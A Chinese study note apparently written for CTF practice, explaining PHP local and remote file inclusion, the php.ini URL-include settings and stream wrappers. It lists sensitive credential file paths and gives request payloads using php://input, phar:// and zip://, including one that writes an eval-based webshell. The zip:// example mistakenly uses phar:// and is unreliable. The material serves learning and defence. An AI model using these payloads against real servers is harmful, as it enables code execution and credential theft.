---
description: 这里将通过参考文章和做题一起进行总结，并且文件包含漏洞，很多都利用了文件上传漏洞，所以这里也会总结一些文件上传漏洞的知识。
---

# 🍉 FL漏洞知识点总结

## <mark style="color:blue;background-color:green;">1.include/require/include\_one/require\_one</mark>

在PHP语法篇的10.文件里面我们讲了include和require和include\_one和require\_one这些，如果大家忘记了，可以返回去看看。

{% content-ref url="../rce-yuan-cheng-dai-ma-zhi-hang/php-yu-fa.md" %}
[php-yu-fa.md](../rce-yuan-cheng-dai-ma-zhi-hang/php-yu-fa.md)
{% endcontent-ref %}

***

## <mark style="color:blue;background-color:green;">2.allow\_url\_include/allow\_url\_fopen</mark>

其实我看到老师写的书上也还在说这个，但是我看官方手册上面allow\_url\_include自php7.4就废除了，还发现就算是再新的书都有一定的滞后性，大家还是以手册为主。虽然废除了，但是我们还是讲解这两个在php.ini配置文件中的作用

### <mark style="color:purple;background-color:yellow;">1）allow\_url\_include</mark>

这个选项允许include,require,include\_one和require四个函数的使用。

{% hint style="info" %}
这个设置项需要开启 allow\_url\_fopen 。
{% endhint %}

### <mark style="color:purple;background-color:yellow;">2）allow\_url\_fopen</mark>

本选项激活了 URL 形式的 fopen 封装协议使得可以访问 URL 对象例如文件。默认的封装协议提供用 ftp 和 http 协议来访问。

***

## <mark style="color:blue;background-color:green;">3.php伪协议</mark>

我们在RCE漏洞知识点总结的5.php伪协议里面讲了php伪协议，忘记了也可以去看看

{% content-ref url="../rce-yuan-cheng-dai-ma-zhi-hang/rce-lou-dong-zhi-shi-dian-zong-jie.md" %}
[rce-lou-dong-zhi-shi-dian-zong-jie.md](../rce-yuan-cheng-dai-ma-zhi-hang/rce-lou-dong-zhi-shi-dian-zong-jie.md)
{% endcontent-ref %}

{% hint style="info" %}
这里总结一下四个主要的协议是用在哪些方面。

```php
1.php://filter              主要用于读取源码
2.php://input               经常使用file_get_contents获取php://input内容
3.data://                   执行命令
4.file://                   访问本地文件系统
```
{% endhint %}

***

在有以上的知识的基础上我们要介绍这个FL漏洞了。主要是分为本地文件包含漏洞和远程文件包含漏洞。

## <mark style="color:blue;background-color:green;">1.本地文件包含漏洞</mark>

本地文件包含漏洞是指能打开并且包含本地文件的漏洞，大部分都是这个漏洞。不受allow\_url\_fopen和allow\_url\_include的影响

***

## <mark style="color:blue;background-color:green;">2.远程文件包含漏洞</mark>

远程文件包含漏洞是指能够包含远程的文件并且执行他们，这个远程是我们可控的，所以危害较大，并且要求allow\_url\_fopen和allow\_url\_include都打开为on才能够执行。

***

## <mark style="color:blue;background-color:green;">3.敏感文件的目录</mark>

这里主要是要进行目录穿越或者是遍历任意文件时用到，虽然有很多，但是也不知道有用没用，都积累一下吧。

> <mark style="color:orange;">**linux**</mark>下：

```url
/etc/passwd // 账户信息

/etc/shadow // 账户密码文件

/usr/local/app/apache2/conf/httpd.conf // Apache2默认配置文件

/usr/local/app/apache2/conf/extra/httpd-vhost.conf // 虚拟网站配置

/usr/local/app/php5/lib/php.ini // PHP相关配置

/etc/httpd/conf/httpd.conf // Apache配置文件

/etc/my.conf // mysql 配置文件
```

> <mark style="color:orange;">**windows**</mark>下

```url
c:\boot.ini // 查看系统版本

c:\windows\system32\inetsrv\MetaBase.xml // IIS配置文件

c:\windows\repair\sam // 存储Windows系统初次安装的密码

c:\ProgramFiles\mysql\my.ini // MySQL配置

c:\ProgramFiles\mysql\data\mysql\user.MYD // MySQL root密码

c:\windows\php.ini // php 配置信息
```

***

## <mark style="color:blue;background-color:green;">4.php伪协议</mark>

在开头我们也放了php伪协议，虽然有相同的运用之处，但是也有一些差别，我们会专门就这个漏洞再来补充他们在这个漏洞的用法。有些不怎么要用或者之前已经详细讲过的就直接跳过去了。

### <mark style="color:purple;background-color:yellow;">1)file://</mark>

访问本地文件系统。

条件：无要求

姿势：

```url
http://*********.php/?file=file://C:/Windows/win.ini
```

### <mark style="color:purple;background-color:yellow;">2）php://input</mark>

<figure><img src="../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

可以直接读取到POST上没有经过解析的原始数据。我们之前提到过，input后面可以加上post的body执行php代码。

{% hint style="warning" %}
`enctype="multipart/form-data"` 的时候 `php://input` 是无效的。
{% endhint %}

条件：

* allow\_url\_include=<mark style="color:red;">On</mark>

姿势：

#### _①执行代码_

```url
http://*******.php/?file=php://input
/*[post]
<?php phpinfo()?>*/
```

后面的注释的php代码需要通过post传递。

{% hint style="info" %}
当出现file\_get\_contents函数时，我们就要想到用php://input了
{% endhint %}

#### ②执行命令

```url
http://******.php/?file=php://input
/*[post]
<?php system('ls');?>*/
```

#### ③写入木马

```url
http://******.php/?file=php://input
/*[post]
<?php fputs(fopen('hack.php','w'),'<?php @eval($_POST['123456'])?>');?>*/
```

解释一下上面的php语句吧。可能因为之前没有见到过可能不太理解。这里了解两个函数之后就容易理解了，就是后面的木马代码是写入到前面fopen打开的文件里面的。

> fputs（）/fwrite()：写入文件
>
> 并且是把data写入到scream里面。
>
> ```php
> fwrite(resource $stream, string $data, ?int $length = null): int|false
> ```

> fopen():打开文件或者url。
>
> filename可以是文件，可以是url。
>
> ```php
> fopen(string $filename, string $mode,bool $use_include_path = false,?resource $context = null
> ): resource|false
> ```
>
> 并且模式和c语言打开文件一样这里贴张图大家看吧
>
>

<figure><img src="../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:purple;background-color:yellow;">3）php://filter</mark>

这个之前就讲的详细了，没啥好补充的。

### <mark style="color:purple;background-color:yellow;">4）phar://</mark>

这个之前没讲过，但是在这里要用到，补充一下。

是php解压缩包的协议，<mark style="color:red;">**并且不管后面是什么都会解压缩，无差别平等攻击**</mark>

要求：

* phpversion>=5.3

姿势：

#### ①执行代码：

写一个php代码比如\<?php echo"hellp";?>，然后打包成zip压缩模式的压缩包

{% hint style="danger" %}
注意，这个压缩模式必须是zip，不能是7zip，rar这种。此外，压缩包的后缀名可以不一定是zip，还可以是111，222，txt都可以。
{% endhint %}

<figure><img src="../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

然后指定绝对目录

```url
http://localhost:3000/study.php?file=phar://F:\php%20code\1.zip\1.php
```

<figure><img src="../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

当然相对目录也可以

```url
http://localhost:3000/study.php?file=phar://1.zip/1.php
```

<figure><img src="../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

#### ②执行命令:

只要把php代码修改一下变成执行命令的语句就可以，其他都不变，这里就不测试了因为步骤都是一样的

#### ③写入木马：

同理

### <mark style="color:purple;background-color:yellow;">5)zip://</mark>

和上面的phar（）的作用是一样的，就是用法不一样。我们直接说区别了其他都是一样的。他们的区别主要是在路径上。

{% hint style="danger" %}
zip://只能用<mark style="color:red;">绝对路径</mark>不能用相对路径。
{% endhint %}

并且压缩文件包和压缩文件之间要用#连接，并且这个#得经过url编码，也就是%23。

```url
http://localhost:3000/study.php?file=phar://F:\php%20code\1.zip%231.php
```

### <mark style="color:purple;background-color:yellow;">6）data://</mark>

就是之前的两句话之前已经很详细地说了。

***

## <mark style="color:blue;background-color:green;">5.包含session</mark>

首先我们先介绍一下session是什么

>













## <mark style="color:red;background-color:orange;">参考门：</mark>

[https://www.freebuf.com/articles/web/182280.html](https://www.freebuf.com/articles/web/182280.html)

[https://www.anquanke.com/post/id/248627#h3-1](https://www.anquanke.com/post/id/248627#h3-1)
